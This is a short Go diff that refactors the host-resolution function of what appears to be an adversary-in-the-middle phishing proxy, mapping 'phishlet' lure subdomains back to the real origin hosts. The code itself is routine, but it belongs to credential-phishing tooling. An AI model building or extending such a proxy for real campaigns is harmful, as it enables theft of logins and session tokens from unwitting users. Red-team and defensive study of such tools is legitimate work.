@@ -29,10 +29,10 @@ func (h *URLRewriter) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 
 func resolveOrigHost(p *aitm.Phishlet, phishHost string) string {
 	lowerPhishHost := strings.ToLower(phishHost)
-	for _, proxyHost := range p.ProxyHosts {
-		phishFQDN := strings.ToLower(proxyHost.PhishSubdomain + "." + p.BaseDomain)
+	for i := range p.ProxyHosts {
+		phishFQDN := strings.ToLower(p.ProxyHosts[i].PhishSubdomain + "." + p.BaseDomain)
 		if lowerPhishHost == phishFQDN {
-			return proxyHost.OrigSubdomain + "." + proxyHost.Domain
+			return p.ProxyHosts[i].OriginHost()
 		}
 	}
 	return ""
